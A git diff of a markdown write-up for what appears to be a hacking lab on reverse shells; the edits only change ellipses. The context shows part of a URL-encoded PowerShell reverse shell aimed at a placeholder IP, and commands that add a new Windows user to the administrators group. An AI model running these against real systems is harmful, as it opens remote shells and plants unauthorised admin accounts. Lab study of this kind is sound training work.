@@ -162,7 +162,7 @@ Remember, `-l` and `-p` are for *listners*!
 
 Okay, the auto-stabilized socat shells are pretty freakin' cool.
 
-...Also, I'm really not sure why socat's syntax is considered that much harder. It's pretty readable.
+…Also, I'm really not sure why socat's syntax is considered that much harder. It's pretty readable.
 
 > Look through PayloadsAllTheThings and try some of the other reverse shell techniques. Try to analyze them and see *why* they work.
 
@@ -196,7 +196,7 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 
 Remember to replace `<IP>` and `<PORT>`.
 
-One annoying thing about this reverse shell... There's no initial prompt, so you have no idea whether you've connected or not. but as soon as you enter a command (`whoami`, etc.), a prompt will appear after the output. On the plus side, however, this reverse shell will persist even after the PHP script times out!
+One annoying thing about this reverse shell… There's no initial prompt, so you have no idea whether you've connected or not. but as soon as you enter a command (`whoami`, etc.), a prompt will appear after the output. On the plus side, however, this reverse shell will persist even after the PHP script times out!
 
 > The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP.
 
@@ -207,7 +207,7 @@ net user $USERNAME $PASSWORD /add
 net localgroup administrators $USERNAME /add
 ```
 
-It's worth noting that users added via `net user` seem to bypass Windows' password policies...
+It's worth noting that users added via `net user` seem to bypass Windows' password policies…
 
 It seems that xfreerdp is installed on Kali Linux, so we can connect from there.
 
